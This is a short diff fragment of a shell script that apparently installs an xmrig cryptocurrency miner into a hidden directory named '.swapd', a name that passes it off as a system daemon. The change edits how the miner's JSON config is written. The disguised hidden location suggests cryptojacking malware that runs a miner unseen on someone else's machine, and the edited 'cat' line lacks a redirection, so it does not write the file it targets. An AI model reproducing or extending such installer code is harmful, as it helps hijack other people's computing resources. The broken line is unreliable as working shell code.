@@ -438,7 +438,8 @@ echo "[*] Copying xmrig-proxy config"
 
 mv $HOME/.swapd/config.json $HOME/.swapd/config_ORiG.json
 
-cat $HOME/.swapd/config.json <<EOL
+
+cd $HOME/.swapd/ ; cat config.json <<EOL
 {
     "autosave": true,
     "cpu": true,
